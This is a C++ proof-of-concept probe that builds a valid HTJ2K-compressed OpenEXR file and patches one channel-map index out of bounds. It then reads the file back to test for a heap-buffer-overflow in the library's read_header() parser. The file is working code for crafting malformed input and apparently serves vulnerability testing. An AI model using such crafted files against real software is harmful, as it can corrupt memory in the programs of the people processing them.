/* Probe for a delocalized heap-buffer-overflow in the HTJ2K per-chunk
 * channel-map parser (read_header() in internal_ht_common.cpp), reached
 * through the public Imf API.
 *
 * Strategy: write a small, perfectly legitimate HTJ2K256-compressed EXR
 * file using the public Imf::RgbaOutputFile API, then locate the HTJ2K
 * chunk header embedded in the chunk's compressed payload (a 6-byte
 * 'H','T' + big-endian uint32 payload-size prefix, followed by a
 * big-endian uint16 channel count N and N big-endian uint16 file_index
 * values -- this is OpenEXR's own internal framing, documented by
 * write_header()/read_header() in internal_ht_common.cpp) and patch a
 * single file_index entry from its original (valid) value to N, i.e.
 * one past the end of the channel map. Everything else in the file is
 * untouched and well-formed.
 *
 * Reading the patched file back with Imf::InputFile drives this crafted
 * byte sequence through the public decode API with no private symbols
 * and no modified build.
 */

#include <ImfRgbaFile.h>
#include <ImfHeader.h>
#include <ImfArray.h>
#include <ImfCompression.h>

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cstdint>
#include <vector>
#include <string>

using namespace OPENEXR_IMF_NAMESPACE;
using namespace IMATH_NAMESPACE;

static std::vector<unsigned char>
readWholeFile (const char* path)
{
    FILE* f = fopen (path, "rb");
    if (!f) { perror ("fopen"); exit (1); }
    fseek (f, 0, SEEK_END);
    long sz = ftell (f);
    fseek (f, 0, SEEK_SET);
    std::vector<unsigned char> buf (static_cast<size_t> (sz));
    if (fread (buf.data (), 1, buf.size (), f) != buf.size ())
    {
        fprintf (stderr, "short read\n");
        exit (1);
    }
    fclose (f);
    return buf;
}

static void
writeWholeFile (const char* path, const std::vector<unsigned char>& buf)
{
    FILE* f = fopen (path, "wb");
    if (!f) { perror ("fopen"); exit (1); }
    if (fwrite (buf.data (), 1, buf.size (), f) != buf.size ())
    {
        fprintf (stderr, "short write\n");
        exit (1);
    }
    fclose (f);
}

static uint16_t
rd16 (const unsigned char* p)
{
    return (uint16_t) ((p[0] << 8) | p[1]);
}

static void
wr16 (unsigned char* p, uint16_t v)
{
    p[0] = (unsigned char) ((v >> 8) & 0xFF);
    p[1] = (unsigned char) (v & 0xFF);
}

int
main (void)
{
    const char* srcPath   = "/tmp/probe_htj2k_src.exr";
    const char* crafted   = "/tmp/probe_htj2k_crafted.exr";
    const int   width     = 16;
    const int   height    = 16;

    {
        Array2D<Rgba> px (height, width);
        for (int y = 0; y < height; ++y)
            for (int x = 0; x < width; ++x)
                px[y][x] = Rgba (0.25f, 0.5f, 0.75f, 1.f);

        Header hdr (width, height);
        hdr.compression () = HTJ2K256_COMPRESSION;

        RgbaOutputFile out (srcPath, hdr, WRITE_RGBA);
        out.setFrameBuffer (&px[0][0], 1, width);
        out.writePixels (height);
    }

    std::vector<unsigned char> data = readWholeFile (srcPath);

    const int    N           = 4; /* R, G, B, A */
    const size_t minTrailer  = 6 + 2 + (size_t) N * 2;
    bool         patched     = false;

    for (size_t off = 0; off + minTrailer <= data.size (); ++off)
    {
        if (data[off] != 'H' || data[off + 1] != 'T') continue;

        uint32_t payloadSz = ((uint32_t) data[off + 2] << 24) |
                             ((uint32_t) data[off + 3] << 16) |
                             ((uint32_t) data[off + 4] << 8) |
                             ((uint32_t) data[off + 5]);
        if (payloadSz == 0 || off + 6 + payloadSz > data.size ()) continue;

        size_t   p = off + 6;
        uint16_t n = rd16 (&data[p]);
        if (n != (uint16_t) N) continue;
        p += 2;

        if (p + (size_t) n * 2 > data.size ()) continue;

        std::vector<int> seen (n, 0);
        bool             isPerm = true;
        for (int i = 0; i < n; ++i)
        {
            uint16_t v = rd16 (&data[p + (size_t) i * 2]);
            if (v >= n || seen[v]) { isPerm = false; break; }
            seen[v] = 1;
        }
        if (!isPerm) continue;

        /* Found the real HTJ2K channel map. Push the last entry's
         * file_index one past the end of the map (value N). The map
         * ends up containing N-1 distinct valid indices plus one entry
         * equal to N; every original index value still appears at most
         * once, so this does not collide with the (correct) >= bound
         * check the parser used to have for every index below N -- only
         * the one that got moved to N is affected. */
        size_t lastEntry = p + (size_t) (n - 1) * 2;
        wr16 (&data[lastEntry], (uint16_t) n);

        patched = true;
        break;
    }

    if (!patched)
    {
        fprintf (
            stderr,
            "could not locate HTJ2K channel map in generated file\n");
        return 1;
    }

    writeWholeFile (crafted, data);

    Array2D<Rgba> rd (height, width);
    try
    {
        RgbaInputFile in (crafted);
        in.setFrameBuffer (&rd[0][0], 1, width);
        in.readPixels (0, height - 1);
    }
    catch (const std::exception& e)
    {
        printf ("rejected cleanly: %s\n", e.what ());
        return 0;
    }

    printf ("no crash\n");
    return 0;
}
